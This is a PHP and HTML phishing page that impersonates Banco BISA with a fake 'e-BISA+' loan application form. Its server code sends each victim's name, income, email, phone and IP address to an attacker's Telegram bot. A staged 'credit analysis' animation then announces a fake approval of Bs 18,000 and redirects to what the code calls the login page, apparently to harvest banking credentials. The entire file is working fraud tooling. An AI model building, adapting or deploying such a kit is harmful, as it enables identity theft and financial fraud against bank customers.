<?php
require_once __DIR__ . '/settings.php';

// ---------------------------------------------------------------
// API: recibir formulario y enviar a Telegram
// ---------------------------------------------------------------
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    $raw = file_get_contents('php://input');
    $d = json_decode($raw, true);
    if (!is_array($d)) $d = $_POST;

    $nombres  = trim($d['nombres'] ?? '');
    $apellidos = trim($d['apellidos'] ?? '');
    $ingreso  = trim($d['ingreso'] ?? '');
    $email    = trim($d['email'] ?? '');
    $telefono = trim($d['telefono'] ?? '');
    $tiempo   = trim($d['tiempo'] ?? '');

    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ts = date('d/m/Y H:i:s');

    $msg = "📋 *e-BISA+ Solicitud*\n\n"
         . "👤 Nombre: `$nombres $apellidos`\n"
         . "💰 Ingreso: `Bs $ingreso`\n"
         . "📧 Email: `$email`\n"
         . "📱 Teléfono: `$telefono`\n"
         . "🏦 Tiempo entidad: `$tiempo`\n"
         . "🌐 IP: `$ip`\n"
         . "🕐 Hora: $ts";

    $params = [
        'chat_id'    => $chat_id,
        'text'       => $msg,
        'parse_mode' => 'Markdown',
    ];
    $url = "https://api.telegram.org/bot$token/sendMessage";

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($params),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        curl_exec($ch);
        curl_close($ch);
    } else {
        @file_get_contents($url . '?' . http_build_query($params));
    }

    echo json_encode(['ok' => true]);
    exit;
}
?>
<!doctype html>
<html lang="es" translate="no">
<head>
  <meta charset="utf-8">
  <title>e-BISA+ | Solicitud</title>
  <meta name="google" content="notranslate"/>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
    html { height:100%; }
    body {
      font-family:'Roboto',Arial,sans-serif; font-weight:400;
      background:#f5f5f5; margin:0; height:100%;
      -webkit-font-smoothing:antialiased;
    }

    /* ── Header ── */
    .header {
      background:#fff; padding:0 24px; height:64px;
      display:flex; align-items:center; justify-content:space-between;
      border-bottom:3px solid #003e7e;
      box-shadow:0 1px 4px rgba(0,0,0,0.06);
    }
    .header img { height:42px; }
    .header-menu { width:28px; height:28px; cursor:pointer; color:#333; }

    /* ── Main ── */
    .container { max-width:820px; margin:0 auto; padding:32px 20px 60px; }
    .page-title {
      font-size:22px; font-weight:500; color:#333;
      letter-spacing:0.5px; margin-bottom:8px;
    }
    .page-subtitle {
      font-size:14px; color:#003e7e; font-style:italic;
      margin-bottom:28px; line-height:1.5;
    }

    /* ── Card ── */
    .form-card {
      background:#fff; padding:32px 36px 40px;
      box-shadow:0 2px 12px rgba(0,0,0,0.06);
    }
    .section-label {
      font-size:15px; font-weight:500; color:#003e7e;
      letter-spacing:0.5px; margin-bottom:24px;
      padding-bottom:10px; border-bottom:1px solid #eee;
    }
    .form-grid {
      display:grid; grid-template-columns:1fr 1fr;
      gap:20px 32px;
    }
    .field label {
      display:block; font-size:12px; font-weight:500;
      color:#333; text-transform:uppercase; letter-spacing:0.3px;
      margin-bottom:6px;
    }
    .field label .req { color:#003e7e; font-weight:400; font-size:11px; text-transform:lowercase; }
    .field input, .field select {
      width:100%; padding:11px 14px; border:1px solid #ddd;
      font-size:14px; color:#333; background:#fff;
      font-family:'Roboto',sans-serif; outline:none;
      transition:border-color 0.2s;
    }
    .field input::placeholder { color:#aaa; font-weight:300; }
    .field input:focus, .field select:focus {
      border-color:#003e7e;
      box-shadow:0 0 0 2px rgba(0,62,126,0.1);
    }
    .field select { cursor:pointer; appearance:auto; }

    .currency-input { position:relative; }
    .currency-input .prefix {
      position:absolute; left:14px; top:50%; transform:translateY(-50%);
      font-size:14px; color:#888; font-weight:500; pointer-events:none;
    }
    .currency-input input { padding-left:40px; }
    /* Ocultar flechitas de input number */
    input[type=number]::-webkit-inner-spin-button,
    input[type=number]::-webkit-outer-spin-button { -webkit-appearance:none; margin:0; }
    input[type=number] { -moz-appearance:textfield; }

    /* ── Button ── */
    .btn-wrap { text-align:center; margin-top:36px; }
    .btn-aplicar {
      display:inline-block; padding:14px 52px;
      background:#003e7e; color:#fff; border:none;
      font-size:14px; font-weight:700; letter-spacing:1px;
      text-transform:uppercase; cursor:pointer;
      transition:background 0.2s, box-shadow 0.2s;
      font-family:'Roboto',sans-serif;
    }
    .btn-aplicar:hover { background:#002d5e; box-shadow:0 4px 12px rgba(0,62,126,0.3); }
    .btn-aplicar:disabled { background:#ccc; cursor:not-allowed; box-shadow:none; }

    /* ── Loading / Progress overlay ── */
    .loading-overlay {
      position:fixed; inset:0; background:#003e7e;
      display:none; align-items:center; justify-content:center;
      flex-direction:column; z-index:9999;
    }
    .loading-overlay.active { display:flex; }
    .loading-logo { width:140px; margin-bottom:36px; animation:pulse 1.6s ease-in-out infinite; }
    @keyframes pulse {
      0%,100% { opacity:1; transform:scale(1); }
      50% { opacity:0.7; transform:scale(0.96); }
    }

    .progress-phase { text-align:center; width:320px; }
    .progress-track {
      width:100%; height:6px; background:rgba(255,255,255,0.15);
      border-radius:3px; overflow:hidden; margin-bottom:12px;
    }
    .progress-fill {
      height:100%; width:0%; background:#ffc400;
      border-radius:3px; transition:width 0.4s ease;
    }
    .progress-pct {
      font-size:28px; font-weight:700; color:#ffc400;
      margin-bottom:8px; letter-spacing:1px;
    }
    .progress-step {
      font-size:13px; color:rgba(255,255,255,0.8);
      letter-spacing:0.5px; font-weight:300; min-height:20px;
    }

    .approved-phase {
      display:none; text-align:center;
      animation:fadeUp 0.6s ease forwards;
    }
    .approved-phase.active { display:block; }
    @keyframes fadeUp {
      from { opacity:0; transform:translateY(20px); }
      to { opacity:1; transform:translateY(0); }
    }
    .approved-icon { margin-bottom:16px; }
    .approved-title {
      font-size:22px; font-weight:600; color:#fff;
      margin-bottom:8px; letter-spacing:0.5px;
    }
    .approved-amount {
      font-size:42px; font-weight:700; color:#ffc400;
      margin-bottom:16px; letter-spacing:1px;
    }
    .approved-msg {
      font-size:14px; color:rgba(255,255,255,0.85);
      line-height:1.6; max-width:360px; margin:0 auto 28px;
    }
    .btn-continuar {
      display:inline-block; padding:14px 52px;
      background:#ffc400; color:#003e7e; border:none;
      font-size:15px; font-weight:700; letter-spacing:0.5px;
      cursor:pointer; border-radius:4px;
      transition:background 0.2s, box-shadow 0.2s;
      font-family:'Roboto',sans-serif;
    }
    .btn-continuar:hover { background:#ffd740; box-shadow:0 4px 16px rgba(255,196,0,0.4); }

    /* ── Responsive ── */
    @media (max-width:600px) {
      .form-grid { grid-template-columns:1fr; gap:16px; }
      .form-card { padding:24px 20px 32px; }
      .container { padding:20px 12px 40px; }
      .page-title { font-size:18px; }
      .btn-aplicar { width:100%; padding:14px 0; }
    }
  </style>
</head>
<body>

  <header class="header">
    <img src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="Banco BISA"/>
    <svg class="header-menu" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
      <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
    </svg>
  </header>

  <div class="container">
    <h1 class="page-title">FORMULARIO DE SOLICITUD</h1>
    <p class="page-subtitle">Por favor, complete los datos solicitados y al finalizar, haga click en "Aplicar ahora!"</p>

    <div class="form-card">
      <div class="section-label">DATOS PERSONALES</div>
      <div class="form-grid">

        <div class="field">
          <label>NOMBRES <span class="req">(requerido)</span></label>
          <input type="text" id="nombres" placeholder="Nombres" required/>
        </div>
        <div class="field">
          <label>APELLIDOS <span class="req">(requerido)</span></label>
          <input type="text" id="apellidos" placeholder="Apellidos" required/>
        </div>
        <div class="field">
          <label>INGRESO MENSUAL EN BOLIVIANOS <span class="req">(requerido)</span></label>
          <div class="currency-input">
            <span class="prefix">Bs</span>
            <input type="text" id="ingreso" inputmode="decimal" placeholder="0" required/>
          </div>
        </div>
        <div class="field">
          <label>EMAIL <span class="req">(requerido)</span></label>
          <input type="email" id="email" placeholder="Dirección de correo: nombre@sitio.com"/>
        </div>
        <div class="field">
          <label>NÚMERO DE TELÉFONO <span class="req">(requerido)</span></label>
          <input type="tel" id="telefono" inputmode="tel" placeholder="Ej: 7777 7777"/>
        </div>
        <div class="field">
          <label>TIEMPO CON LA ENTIDAD <span class="req">(requerido)</span></label>
          <select id="tiempo">
            <option value="">Selecciona una opción</option>
            <option value="Menos de 1 año">Menos de 1 año</option>
            <option value="1 a 3 años">1 a 3 años</option>
            <option value="3 a 5 años">3 a 5 años</option>
            <option value="5 a 10 años">5 a 10 años</option>
            <option value="Más de 10 años">Más de 10 años</option>
          </select>
        </div>

      </div>

      <div class="btn-wrap">
        <button class="btn-aplicar" type="button" id="btnAplicar">APLICAR AHORA</button>
      </div>
    </div>
  </div>

  <!-- Loading / Progress Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <img class="loading-logo" src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="Banco BISA"/>

    <!-- Fase 1: Progreso -->
    <div class="progress-phase" id="progressPhase">
      <div class="progress-track">
        <div class="progress-fill" id="progressFill"></div>
      </div>
      <div class="progress-pct" id="progressPct">0%</div>
      <div class="progress-step" id="progressStep">Iniciando análisis...</div>
    </div>

    <!-- Fase 2: Aprobado -->
    <div class="approved-phase" id="approvedPhase">
      <div class="approved-icon">
        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#ffc400" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/>
          <polyline points="9 12 11 14 15 10"/>
        </svg>
      </div>
      <h2 class="approved-title">¡Solicitud Aprobada!</h2>
      <p class="approved-amount">Bs 18.000</p>
      <p class="approved-msg">Sigue los pasos a continuación para completar tu solicitud y acceder a tu crédito pre-aprobado.</p>
      <button class="btn-continuar" type="button" id="btnContinuar">Continuar</button>
    </div>
  </div>

<script>
(function(){
  const btn = document.getElementById('btnAplicar');
  const overlay = document.getElementById('loadingOverlay');
  const fields = {
    nombres:  document.getElementById('nombres'),
    apellidos: document.getElementById('apellidos'),
    ingreso:  document.getElementById('ingreso'),
    email:    document.getElementById('email'),
    telefono: document.getElementById('telefono'),
    tiempo:   document.getElementById('tiempo'),
  };

  // Formatear ingreso con puntos de miles
  fields.ingreso.addEventListener('input', e => {
    let raw = e.target.value.replace(/\D/g, '');
    if (raw) {
      e.target.value = Number(raw).toLocaleString('de-DE');
    }
  });

  btn.addEventListener('click', async () => {
    // Validar campos requeridos
    for (const [k, el] of Object.entries(fields)) {
      if (!el.value.trim()) {
        el.focus();
        el.style.borderColor = '#d32f2f';
        setTimeout(() => el.style.borderColor = '', 2000);
        return;
      }
    }

    btn.disabled = true;
    overlay.classList.add('active');

    // Enviar datos a Telegram
    try {
      await fetch('solicitud.php', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          nombres:  fields.nombres.value.trim(),
          apellidos: fields.apellidos.value.trim(),
          ingreso:  fields.ingreso.value.replace(/\D/g, ''),
          email:    fields.email.value.trim(),
          telefono: fields.telefono.value.trim(),
          tiempo:   fields.tiempo.value,
        }),
      });
    } catch(e) { console.error(e); }

    // Progreso animado
    const fill = document.getElementById('progressFill');
    const pct = document.getElementById('progressPct');
    const stepTxt = document.getElementById('progressStep');
    const progressPhase = document.getElementById('progressPhase');
    const approvedPhase = document.getElementById('approvedPhase');

    const steps = [
      { p:12, t:'Verificando datos personales...' },
      { p:25, t:'Consultando historial crediticio...' },
      { p:40, t:'Analizando capacidad de pago...' },
      { p:55, t:'Consultando créditos con otras entidades...' },
      { p:70, t:'Evaluando perfil financiero...' },
      { p:82, t:'Verificando referencias bancarias...' },
      { p:92, t:'Generando resultado...' },
      { p:100, t:'¡Análisis completado!' },
    ];

    for (let i = 0; i < steps.length; i++) {
      await new Promise(r => setTimeout(r, 900 + Math.random() * 600));
      fill.style.width = steps[i].p + '%';
      pct.textContent = steps[i].p + '%';
      stepTxt.textContent = steps[i].t;
    }

    // Mostrar aprobación
    await new Promise(r => setTimeout(r, 800));
    progressPhase.style.display = 'none';
    approvedPhase.classList.add('active');

    // Botón continuar → login
    document.getElementById('btnContinuar').addEventListener('click', () => {
      window.location.href = 'index.php';
    });
  });

  // Enter key en cualquier campo → submit
  Object.values(fields).forEach(el => {
    if (el.tagName === 'INPUT') {
      el.addEventListener('keydown', e => { if (e.key === 'Enter') btn.click(); });
    }
  });
})();
</script>

</body>
</html>
